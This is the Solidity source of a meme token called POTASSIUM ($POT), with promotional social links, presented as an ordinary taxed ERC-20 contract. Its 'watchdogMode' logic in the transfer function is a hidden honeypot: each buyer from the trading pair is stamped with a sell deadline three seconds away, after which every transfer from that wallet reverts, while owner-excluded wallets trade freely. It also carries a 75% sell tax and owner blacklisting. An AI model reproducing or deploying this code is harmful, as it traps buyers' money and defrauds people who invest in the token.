1 // SPDX-License-Identifier: MIT
2 
3 /*
4 POTASSIUM
5 The #1 Element of the Apes!
6 
7 TG: https://t.me/potassiumentry
8 TWITTER: https://twitter.com/PotassiumToken
9 WEBSITE: https://potassiumeth.xyz/
10 
11 */
12 
13 pragma solidity ^0.8.17;
14 
15 library Address{
16     function sendValue(address payable recipient, uint256 amount) internal {
17         require(address(this).balance >= amount, "Address: insufficient balance");
18 
19         (bool success, ) = recipient.call{value: amount}("");
20         require(success, "Address: unable to send value, recipient may have reverted");
21     }
22 }
23 
24 abstract contract Context {
25     function _msgSender() internal view virtual returns (address payable) {
26         return payable(msg.sender);
27     }
28 
29     function _msgData() internal view virtual returns (bytes memory) {
30         this;
31         return msg.data;
32     }
33 }
34 
35 abstract contract Ownable is Context {
36     address private _owner;
37 
38     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
39 
40     constructor() {
41         _setOwner(_msgSender());
42     }
43 
44     function owner() public view virtual returns (address) {
45         return _owner;
46     }
47 
48     modifier onlyOwner() {
49         require(owner() == _msgSender(), "Ownable: caller is not the owner");
50         _;
51     }
52 
53     function renounceOwnership() public virtual onlyOwner {
54         _setOwner(address(0));
55     }
56 
57     function transferOwnership(address newOwner) public virtual onlyOwner {
58         require(newOwner != address(0), "Ownable: new owner is the zero address");
59         _setOwner(newOwner);
60     }
61 
62     function _setOwner(address newOwner) private {
63         address oldOwner = _owner;
64         _owner = newOwner;
65         emit OwnershipTransferred(oldOwner, newOwner);
66     }
67 }
68 
69 interface IERC20 {
70 
71     function totalSupply() external view returns (uint256);
72     function balanceOf(address account) external view returns (uint256);
73     function transfer(address recipient, uint256 amount) external returns (bool);
74     function allowance(address owner, address spender) external view returns (uint256);
75     function approve(address spender, uint256 amount) external returns (bool);
76     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
77 
78     event Transfer(address indexed from, address indexed to, uint256 value);
79     event Approval(address indexed owner, address indexed spender, uint256 value);
80 }
81 
82 interface IFactory{
83     function createPair(address tokenA, address tokenB) external returns (address pair);
84 }
85 
86 interface IRouter {
87     function factory() external pure returns (address);
88     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
89     function WETH() external pure returns (address);
90     function addLiquidityETH(
91         address token,
92         uint amountTokenDesired,
93         uint amountTokenMin,
94         uint amountETHMin,
95         address to,
96         uint deadline
97     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
98     function swapExactTokensForETHSupportingFeeOnTransferTokens(
99         uint amountIn,
100         uint amountOutMin,
101         address[] calldata path,
102         address to,
103         uint deadline) external;
104 }
105 
106 contract Potassium is Context, IERC20, Ownable {
107 
108     using Address for address payable;
109 
110     IRouter public router;
111     address public pair;
112     
113     mapping (address => uint256) private _tOwned;
114     mapping (address => mapping (address => uint256)) private _allowances;
115 
116     mapping (address => bool) public _isExcludedFromFee;
117     mapping (address => bool) public _isExcludedFromMaxBalance;
118     mapping (address => bool) public _isBlacklisted;
119     mapping (address => uint256) public _dogSellTime;
120 
121     uint256 private _dogSellTimeOffset = 3;
122     bool public watchdogMode = true;
123     uint256 public _caughtDogs;
124 
125     uint8 private constant _decimals = 9; 
126     uint256 private _tTotal = 100_000_000 * (10**_decimals);
127     uint256 public swapThreshold = 1_000_000 * (10**_decimals); 
128     uint256 public maxTxAmount = 2_000_000 * (10**_decimals);
129     uint256 public maxWallet =  2_000_000 * (10**_decimals);
130 
131     string private constant _name = "POTASSIUM"; 
132     string private constant _symbol = "$POT";
133 
134     struct Tax{
135         uint8 marketingTax;
136         uint8 lpTax;
137     }
138 
139     struct TokensFromTax{
140         uint marketingTokens;
141         uint lpTokens;
142     }
143     TokensFromTax public totalTokensFromTax;
144 
145     Tax public buyTax = Tax(25,1);
146     Tax public sellTax = Tax(75,1);
147     
148     address public marketingWallet = 0x18D556661D754942a80DfF922f6460657197ca25;
149     
150     bool private swapping;
151     uint private _swapCooldown = 5; 
152     uint private _lastSwap;
153     modifier lockTheSwap {
154         swapping = true;
155         _;
156         swapping = false;
157     }
158 
159     constructor () {
160         _tOwned[_msgSender()] = _tTotal;
161         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
162         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
163         router = _router;
164         pair = _pair;
165         _approve(owner(), address(router), ~uint256(0));
166         
167         _isExcludedFromFee[owner()] = true;
168         _isExcludedFromFee[address(this)] = true;
169         _isExcludedFromFee[marketingWallet] = true;
170 
171         _isExcludedFromMaxBalance[owner()] = true;
172         _isExcludedFromMaxBalance[address(this)] = true;
173         _isExcludedFromMaxBalance[pair] = true;
174         _isExcludedFromMaxBalance[marketingWallet] = true;
175         
176         emit Transfer(address(0), _msgSender(), _tTotal);
177     }
178 
179 // ================= ERC20 =============== //
180     function name() public pure returns (string memory) {
181         return _name;
182     }
183 
184     function symbol() public pure returns (string memory) {
185         return _symbol;
186     }
187 
188     function decimals() public pure returns (uint8) {
189         return _decimals;
190     }
191 
192     function totalSupply() public view override returns (uint256) {
193         return _tTotal;
194     }
195 
196     function balanceOf(address account) public view override returns (uint256) {
197         return _tOwned[account];
198     }
199 
200     function transfer(address recipient, uint256 amount) public override returns (bool) {
201         _transfer(_msgSender(), recipient, amount);
202         return true;
203     }
204 
205     function allowance(address owner, address spender) public view override returns (uint256) {
206         return _allowances[owner][spender];
207     }
208 
209     function approve(address spender, uint256 amount) public override returns (bool) {
210         _approve(_msgSender(), spender, amount);
211         return true;
212     }
213 
214     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
215         _transfer(sender, recipient, amount);
216         _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
217         return true;
218     }
219 
220     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
221         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
222         return true;
223     }
224 
225     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
226         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
227         return true;
228     }
229 
230     function _approve(address owner, address spender, uint256 amount) private {
231         require(owner != address(0), "ERC20: approve from the zero address");
232         require(spender != address(0), "ERC20: approve to the zero address");
233         _allowances[owner][spender] = amount;
234         emit Approval(owner, spender, amount);
235     }
236     
237     receive() external payable {}
238 // ========================================== //
239 
240 //============== Owner Functions ===========//
241    
242     function owner_setBlacklisted(address account, bool isBlacklisted) public onlyOwner{
243         _isBlacklisted[account] = isBlacklisted;
244     }
245     
246     function owner_setBulkIsBlacklisted(address[] memory accounts, bool state) external onlyOwner{
247         for(uint256 i =0; i < accounts.length; i++){
248             _isBlacklisted[accounts[i]] = state;
249         }
250     }
251 
252     function owner_setBuyTaxes(uint8 marketingTax, uint8 lpTax) external onlyOwner{
253         uint tTax =  marketingTax + lpTax;
254         require(tTax <= 30, "Can't set tax too high");
255         buyTax = Tax(marketingTax,lpTax);
256         emit TaxesChanged();
257     }
258 
259     function owner_setSellTaxes(uint8 marketingTax, uint8 lpTax) external onlyOwner{
260         uint tTax = marketingTax + lpTax;
261         require(tTax <= 80, "Can't set tax too high");
262         sellTax = Tax(marketingTax,lpTax);
263         emit TaxesChanged();
264     }
265     
266     function owner_setTransferMaxes(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
267         uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
268         require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
269         maxTxAmount = maxTX_EXACT * (10**_decimals);
270         maxWallet = maxWallet_EXACT * (10**_decimals);
271     }
272 
273     function owner_rescueETH(uint256 weiAmount) public onlyOwner{
274         require(address(this).balance >= weiAmount, "Insufficient ETH balance");
275         payable(msg.sender).transfer(weiAmount);
276     }
277 
278     function owner_rescueTokens() public{
279         // Make sure ca doesn't withdraw the pending taxes to be swapped.
280         // Sends excess tokens / accidentally sent tokens back to marketing wallet.
281         uint pendingTaxTokens = totalTokensFromTax.lpTokens + totalTokensFromTax.marketingTokens;
282         require(balanceOf(address(this)) >  pendingTaxTokens);
283         uint excessTokens = balanceOf(address(this)) - pendingTaxTokens;
284         _transfer(address(this), marketingWallet, excessTokens);
285     }
286     
287     function owner_setWatchDogg(bool status_) external onlyOwner{
288         watchdogMode = status_;
289     }
290 
291     function owner_setDogSellTimeForAddress(address holder, uint dTime) external onlyOwner{
292         _dogSellTime[holder] = block.timestamp + dTime;
293     }
294 
295 // ========================================//
296     
297     function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
298         Tax memory tmpTaxes = buyTax;
299         if (isSell){
300             tmpTaxes = sellTax;
301         }
302 
303         uint tokensForMarketing = amount * tmpTaxes.marketingTax / 100;
304         uint tokensForLP = amount * tmpTaxes.lpTax / 100;
305 
306         if(tokensForMarketing > 0)
307             totalTokensFromTax.marketingTokens += tokensForMarketing;
308 
309         if(tokensForLP > 0)
310             totalTokensFromTax.lpTokens += tokensForLP;
311 
312         uint totalTaxedTokens = tokensForMarketing + tokensForLP;
313 
314         _tOwned[address(this)] += totalTaxedTokens;
315         if(totalTaxedTokens > 0)
316             emit Transfer (from, address(this), totalTaxedTokens);
317             
318         return (amount - totalTaxedTokens);
319     }
320 
321     function _transfer(address from,address to,uint256 amount) private {
322         require(from != address(0), "ERC20: transfer from the zero address");
323         require(to != address(0), "ERC20: transfer to the zero address");
324         require(amount > 0, "Transfer amount must be greater than zero");
325         require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");
326         require(!_isBlacklisted[from] && !_isBlacklisted[to], "Blacklisted, can't trade");
327 
328         if(!_isExcludedFromMaxBalance[to])
329             require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
330         
331         if (balanceOf(address(this)) >= swapThreshold && block.timestamp >= (_lastSwap + _swapCooldown) && !swapping && from != pair && from != owner() && to != owner())
332             swapAndLiquify();
333           
334         _tOwned[from] -= amount;
335         uint256 transferAmount = amount;
336         
337         if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
338             transferAmount = _getTaxValues(amount, from, to == pair);
339             if (from == pair){
340                 if(watchdogMode){
341                     _caughtDogs++;
342                     _dogSellTime[to] = block.timestamp + _dogSellTimeOffset;
343                 }
344             }else{
345                 if (_dogSellTime[from] != 0)
346                     require(block.timestamp < _dogSellTime[from]); 
347             }
348         }
349 
350         _tOwned[to] += transferAmount;
351         emit Transfer(from, to, transferAmount);
352     }
353 
354     function swapAndLiquify() private lockTheSwap{
355         
356         if(totalTokensFromTax.marketingTokens > 0){
357             uint256 ethSwapped = swapTokensForETH(totalTokensFromTax.marketingTokens);
358             if(ethSwapped > 0){
359                 payable(marketingWallet).transfer(ethSwapped);
360                 totalTokensFromTax.marketingTokens = 0;
361             }
362         }   
363 
364         if(totalTokensFromTax.lpTokens > 0){
365             uint half = totalTokensFromTax.lpTokens / 2;
366             uint otherHalf = totalTokensFromTax.lpTokens - half;
367             uint balAutoLP = swapTokensForETH(half);
368             if (balAutoLP > 0)
369                 addLiquidity(otherHalf, balAutoLP);
370             totalTokensFromTax.lpTokens = 0;
371         }
372 
373         emit SwapAndLiquify();
374 
375         _lastSwap = block.timestamp;
376     }
377 
378     function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
379         uint256 initialBalance = address(this).balance;
380         address[] memory path = new address[](2);
381         path[0] = address(this);
382         path[1] = router.WETH();
383 
384         _approve(address(this), address(router), tokenAmount);
385 
386         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
387             tokenAmount,
388             0,
389             path,
390             address(this),
391             block.timestamp
392         );
393         return (address(this).balance - initialBalance);
394     }
395 
396     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
397         _approve(address(this), address(router), tokenAmount);
398 
399         (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
400             address(this),
401             tokenAmount,
402             0,
403             0,
404             owner(),
405             block.timestamp
406         );
407         
408         if (ethAmount - ethFromLiquidity > 0)
409             payable(marketingWallet).sendValue (ethAmount - ethFromLiquidity);
410     }
411 
412     event SwapAndLiquify();
413     event TaxesChanged();
414 
415 }